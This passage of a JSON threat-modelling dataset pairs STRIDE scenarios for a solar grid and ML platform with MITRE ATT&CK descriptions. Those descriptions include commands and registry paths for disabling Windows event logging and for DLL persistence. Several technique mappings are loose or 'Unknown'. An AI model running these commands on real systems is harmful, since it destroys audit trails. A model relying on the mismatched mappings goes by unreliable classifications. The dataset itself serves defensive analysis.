                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny sending specific data commands to the solar grid, alleging system malfunction.",
            "Assumptions": [
                {
                    "Assumption": "There is no detailed audit trail for operator commands.",
                    "Role": "System",
                    "Condition": "Poor audit trail implementation."
                },
                {
                    "Assumption": "Weak user session recording and logging practices.",
                    "Role": "System",
                    "Condition": "Weak session management."
                },
                {
                    "Assumption": "Effective time synchronization mechanisms are missing.",
                    "Role": "System",
                    "Condition": "Unsynchronized system clocks."
                }
            ],
            "Potential Impact": "Difficult to resolve disputes regarding critical operational decisions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit trail",
                "session management",
                "time synchronization"
            ],
            "mitre_technique": {
                "name": "Time Providers",
                "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)",
                "id": "attack-pattern--61afc315-860c-4364-825d-0d62b2e91edc",
                "technique_id": "T1547.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data exposed due to a breach in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains unauthorized access to the TOREADOR platform.",
                    "Role": "Attacker",
                    "Condition": "Credential theft or network breach."
                },
                {
                    "Assumption": "Stored data is not encrypted or uses weak encryption.",
                    "Role": "System",
                    "Condition": "Weak data encryption practices."
                },
                {
                    "Assumption": "Inadequate access control policies in place for sensitive data.",
                    "Role": "System",
                    "Condition": "Poor access management."
                }
            ],
            "Potential Impact": "Leak of sensitive predictions and metadata impacting confidentiality and competitive advantage.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "information disclosure",
                "platform security",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Eavesdropping on data transmissions between Data Logger and Receiver.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network eavesdropping capability."
                },
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "System",
                    "Condition": "Unencrypted communication."
                },
                {
                    "Assumption": "There are no secure tunnels such as VPNs in place.",
                    "Role": "System",
                    "Condition": "Lack of secure communication channels."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of operational and sensor data compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "eavesdropping",
                "information disclosure",
                "network security",
                "unencrypted communication"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker uses malware to exfiltrate sensitive data from the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "The attacker successfully deploys and runs malware on the Dashboard.",
                    "Role": "Attacker",
                    "Condition": "Malware deployment success."
                },
                {
                    "Assumption": "Insufficient endpoint security measures in place.",
                    "Role": "System",
                    "Condition": "Weak endpoint protection."
                },
                {
                    "Assumption": "The data exfiltration is not detected by security monitoring.",
                    "Role": "System",
                    "Condition": "Ineffective monitoring."
                }
            ],
            "Potential Impact": "Compromise of sensitive operational insights and potential breach of operational data.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "data exfiltration",
                "dashboard",
                "endpoint security"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A large volume of malicious requests aimed at the TOREADOR platform disrupts AI/ML model operations.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate large volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Bots or compromised devices available."
                },
                {
                    "Assumption": "The platform lacks robust denial-of-service protection mechanisms.",
                    "Role": "System",
                    "Condition": "Weak DOS protections."
                },
                {
                    "Assumption": "Limited redundancy in AI/ML model processing infrastructure.",
                    "Role": "System",
                    "Condition": "Single points of failure."
                }
            ],
            "Potential Impact": "Disruption of predictive maintenance and power flow optimization services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "platform disruption",
                "AI/ML models",
                "traffic volume"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in the Receiver component to crash the system.",
            "Assumptions": [
                {
                    "Assumption": "Existing unpatched vulnerabilities in the Receiver component.",
                    "Role": "System",
                    "Condition": "Known or unknown vulnerabilities."
                },
                {
                    "Assumption": "The attacker has knowledge of these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability exploitation."
                },
                {
                    "Assumption": "No effective monitoring or patch management system in place.",
                    "Role": "System",
                    "Condition": "Poor vulnerability management."
                }
            ],
            "Potential Impact": "Temporary or permanent disruption of data processing operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability",
                "receiver",
                "system crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack against the public-facing interfaces of the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can orchestrate a large-scale DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Botnet or similar infrastructure."
                },
                {
                    "Assumption": "The Dashboard does not have CDS or other load balancing mechanisms.",
                    "Role": "System",
                    "Condition": "Weak DDoS protection."
                },
                {
                    "Assumption": "Sufficient bandwidth to overwhelm the Dashboard's network capacity.",
                    "Role": "Attacker",
                    "Condition": "High-bandwidth attack."
                }
            ],
            "Potential Impact": "Inaccessibility of critical operational insights for employees.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Dashboard",
                "public-facing",
                "load balancing"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the AI/ML model management system to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Admin-level vulnerabilities exist within the model management system.",
                    "Role": "System",
                    "Condition": "Unpatched software bugs."
                },
                {
                    "Assumption": "The attacker is aware of these vulnerabilities and how to exploit them.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of vulnerabilities and exploitation techniques."
                },
                {
                    "Assumption": "Insufficient access controls and monitoring for privileged accounts.",
                    "Role": "System",
                    "Condition": "Weak privilege management."
                }
            ],
            "Potential Impact": "Unauthorized changes to model configurations impacting system behavior.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "model management",
                "administrative access",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious exploitation of vulnerabilities in the Anonymity Agent allowing attackers to escalate privileges and manipulate data.",
            "Assumptions": [
                {
                    "Assumption": "Existing vulnerabilities in the Anonymity Agent.",
                    "Role": "System",
                    "Condition": "Unpatched agent software."
                },
                {
                    "Assumption": "The attacker knows and can exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and capability to exploit."
                },
                {
                    "Assumption": "Lack of detailed access controls and regular security audits on critical components.",
                    "Role": "System",
                    "Condition": "Weak security controls and auditing."
                }
            ],
            "Potential Impact": "Unauthorized access and control over sensitive data and system processes.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "anonymity agent",
                "vulnerabilities",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Administrator accounts are compromised through phishing, allowing attackers to elevate their privileges within the system.",
            "Assumptions": [
                {
                    "Assumption": "Administrators fall victim to sophisticated phishing attacks.",
                    "Role": "Administrators",
                    "Condition": "Phishing success rate."
                },
                {
                    "Assumption": "Insufficient verification mechanisms for administrative sessions.",
                    "Role": "System",
                    "Condition": "Weak session management."
                },
                {
                    "Assumption": "Lack of regular awareness training on phishing and credential hygiene for administrators.",
                    "Role": "Organization",
                    "Condition": "Lack of security training."
                }
            ],
            "Potential Impact": "Full control over system operations and potential manipulation of data and models.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "administrative access",
                "elevation of privilege",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "19",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker disguises as a valid sensor to send incorrect data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the power station site.",
                    "Role": "Attacker",
                    "Condition": "Physical access allowed or limited security on-site."
                },
                {
                    "Assumption": "The attacker can replicate the identification protocols used by legitimate sensors.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of sensor protocols."
                }
            ],
            "Potential Impact": "Unauthorized data manipulation leading to incorrect predictions and power optimizations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "sensor",
                "data tampering"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to the dashboard using stolen credentials.",
            "Assumptions": [
                {
                    "Assumption": "Credentials have been phished or reused from another compromised service.",
                    "Role": "Attacker",
                    "Condition": "User credential practices."
                },
                {
                    "Assumption": "No multi-factor authentication is enforced.",
                    "Role": "System Designer",
                    "Condition": "Authentication settings."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data and potential manipulation of predictions.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credential access",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics the internet-facing interfaces to collect or forward sensor data.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient validation of internet traffic sources.",
                    "Role": "System Administrator",
                    "Condition": "Network security measures."
                },
                {
                    "Assumption": "The attacker can intercept or modify network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network vulnerabilities."
                }
            ],
            "Potential Impact": "Interception or redirection of traffic leading to data leakage or service disruption.",
            "MITRE ATT&CK Keywords": [
                "network",
                "man-in-the-middle",
                "traffic interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data logs before they are forwarded to the central system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has infiltrated the data logger through network vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Network security weaknesses."
                },
                {
                    "Assumption": "The root-of-trust mechanisms can be bypassed or manipulated.",
                    "Role": "Attacker",
                    "Condition": "Security bypass methods."
                }
            ],
            "Potential Impact": "Data integrity compromised, leading to inaccurate model predictions.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "data logger",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises the integrity of ML models by injecting poisoned training data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the data preprocessing stage.",
                    "Role": "Attacker",
                    "Condition": "Access control failures."
                },
                {
                    "Assumption": "No rigorous validation of training data exists.",
                    "Role": "System Architect",
                    "Condition": "Data hygiene practices."
                }
            ],
            "Potential Impact": "Degraded model performance, leading to unreliable predictions and power optimizations.",
            "MITRE ATT&CK Keywords": [
                "data poisoning",
                "ML models",
                "training data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies metadata associated with the sensor data to mislead context understanding.",
            "Assumptions": [
                {
                    "Assumption": "Weak metadata management and validation processes.",
                    "Role": "System Designer",
                    "Condition": "Validation practices."
                },
                {
                    "Assumption": "Privilege escalation possibilities exist within the metadata management system.",
                    "Role": "Attacker",
                    "Condition": "Access control weaknesses."
                }
            ],
            "Potential Impact": "Inaccurate context for data leading to erroneous model predictions.",
            "MITRE ATT&CK Keywords": [
                "metadata tampering",
                "contextual data",
                "model predictions"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny actions performed on the dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging and auditing of user activities.",
                    "Role": "System Administrator",
                    "Condition": "Logging practices."
                },
                {
                    "Assumption": "No non-repudiation controls implemented.",
                    "Role": "System Designer",
                    "Condition": "Security control implementations."
                }
            ],
            "Potential Impact": "Accountability issues, inability to trace actions to users, and potential malicious activity denial.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to 